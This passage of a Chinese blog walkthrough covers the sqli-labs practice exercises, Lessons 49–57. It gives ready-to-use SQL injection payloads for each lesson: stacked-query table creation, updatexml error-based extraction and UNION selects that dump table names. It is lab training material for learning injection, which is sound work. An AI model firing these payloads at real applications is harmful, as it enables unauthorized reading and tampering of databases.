</code></pre><h2 id="Lesson-49"><a href="#Lesson-49" class="headerlink" title="Lesson 49"></a>Lesson 49</h2><p>与上一题相同，唯一的区别是变成了单引号闭合。<br>时间盲注，exp 就不放上来了。</p>
<h2 id="Lesson-50"><a href="#Lesson-50" class="headerlink" title="Lesson 50"></a>Lesson 50</h2><p>存在 mysqli_multi_query( ) 函数，所以存在堆叠注入。</p>
<p>堆叠注入<br>payload:</p>
<pre><code>?sort=1;create table test like users %23</code></pre><p>亦可以使用报错注入。GET 传值，无闭合。<br>payload：</p>
<pre><code>?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</code></pre><p>盲注亦可。</p>
<h2 id="Lesson-51"><a href="#Lesson-51" class="headerlink" title="Lesson 51"></a>Lesson 51</h2><p>跟上一题相同，唯一区别在于这题为单引号闭合。</p>
<p>报错注入。<br>payload:</p>
<pre><code>?sort=1 &#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><h2 id="Lesson-52"><a href="#Lesson-52" class="headerlink" title="Lesson 52"></a>Lesson 52</h2><p>无报错。存在堆叠注入和时间盲注。</p>
<p>堆叠注入，GET 传值，无闭合。<br>payload:</p>
<pre><code>?sort=1;create table test like users </code></pre><p>时间盲注，exp 同 Lesson 48。</p>
<h2 id="Lesson-53"><a href="#Lesson-53" class="headerlink" title="Lesson 53"></a>Lesson 53</h2><p>跟上一题相同，存在堆叠注入和时间盲注，唯一区别在于这题为单引号闭合。<br>堆叠注入，GET 传值，单引号闭合。<br>payload:</p>
<pre><code>?sort=1&#39;;create table test like users %23</code></pre><p>时间盲注，exp 同 Lessson 49。</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><h2 id="Lesson-54"><a href="#Lesson-54" class="headerlink" title="Lesson 54"></a>Lesson 54</h2><p>题目有英文提示：</p>
<pre><code>The objective of this challenge is to dump the (secret key) from only random table from Database (&#39;CHALLENGES&#39;) in Less than 10 attempts
For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</code></pre><p>大概的意思是，注入的次数如果大于10次，那么数据库端会将表名和字段名以及 secret_key 重置。因此盲注是行不通的了。</p>
<p>使用普通的联合注入，GET 传值，单引号闭合。<br>payload:</p>
<pre><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-55"><a href="#Lesson-55" class="headerlink" title="Lesson 55"></a>Lesson 55</h2><p>跟上一题基本相同，不同的地方在于注入的次数不大于14次，并且变成了 ) 闭合。<br>普通的联合注入，GET 传值，单括号闭合。<br>payload:</p>
<pre><code>?id=-1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-56"><a href="#Lesson-56" class="headerlink" title="Lesson 56"></a>Lesson 56</h2><p>跟上题相同，不同的地方在于变成了 ‘) 闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
<pre><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-57"><a href="#Lesson-57" class="headerlink" title="Lesson 57"></a>Lesson 57</h2><p>跟上题相同，不同的地方在于变成了双引号闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
<pre><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-58"><a href="#Lesson-58" class="headerlink" title="Lesson 58"></a>Lesson 58</h2>
                            <hr>
                        </div>
                        <br>
                        <div>
                            
                            <p>
                                <i class="iconfont icon-tag"></i>
                                
                                    <a class="hover-with-bg" href="/tags/SQL">SQL</a>
                                
                            </p>
                            
                                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
                            
                        </div>
                    </div>
                </div>
            </div>
        <div class="d-none d-lg-block col-lg-2 toc-container">
            
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
    <div class="container comments mx-auto" id="comments">
        
    </div>
</div>
    
</main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank" rel="nofollow noopener"> <b>Material-T</b></a>
    <br>
    
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="/lib/mdbootstrap/js/jquery-3.4.1.min.js"></script>
  <script src="/lib/mdbootstrap/js/popper.min.js"></script>
  <script src="/lib/mdbootstrap/js/bootstrap.min.js?v=4.3.1"></script>
  <script src="/lib/mdbootstrap/js/mdb.min.js?v=4.8.7"></script>
  <script src="/lib/nprogress/nprogress.min.js?v=0.2.0"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
    
    <script src="/js/post.js"></script>
  
  
    <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
    <script>
      $(document).ready(function(){
        $('pre').addClass('prettyprint linenums');
        prettyPrint();
      })
    </script>
  
  
    <script src="/lib/typed/typed.min.js?v=2.0.9"></script>
    <script>
        var typed = new Typed('#subtitle', {
          strings: [
            '  ',
            "Sqli_Lab_Learning&nbsp;",
        ],
        cursorChar: "_",
        typeSpeed: 70,
        startDelay: 300, //开始之前延迟300毫秒
        loop: false,
        });
        $(".typed-cursor").addClass("h2");
    </script>
  
  
    <script src="/lib/anchor/anchor.min.js?v=4.2.0"></script>
    <script>
      anchors.options = {
        placement: "right",
        visible: "false",
        
      };
      anchors.add(".post-content > h1,h2,h3,h4,h5,h6");
    </script>
  
</body>
</html>